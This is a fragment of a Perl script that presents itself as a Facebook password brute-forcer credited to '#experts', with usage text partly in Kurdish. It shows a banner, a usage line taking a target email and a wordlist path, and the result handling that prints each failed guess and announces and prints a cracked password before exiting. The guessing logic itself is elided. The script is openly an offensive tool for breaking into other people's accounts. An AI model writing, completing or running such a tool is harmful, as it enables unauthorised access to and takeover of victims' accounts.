...
system('clear');
print "\n+++ FaceBook brute by #experts\n";
print "+++ awa bakar det -> perl fb-brute.pl EMAILi kabra /root/...naw nishani wordlistaka
    nmunaiak : perl fb-brute.pl azad@*****.com /root/wordlist.txt \n";
...
if (!defined $success)
{
print "[-] $password -> ba daxawa :( \n";
close SSL;
}
else
{
print "\n#*#*#*#*#*#*############################################\n";
print "[+] YAAAYY!!PASS DOZRAYAWA => Pass is $password :D\n";
print "#*#*#*#*#*#*############################################\n\n";
close SSL;
exit;
}
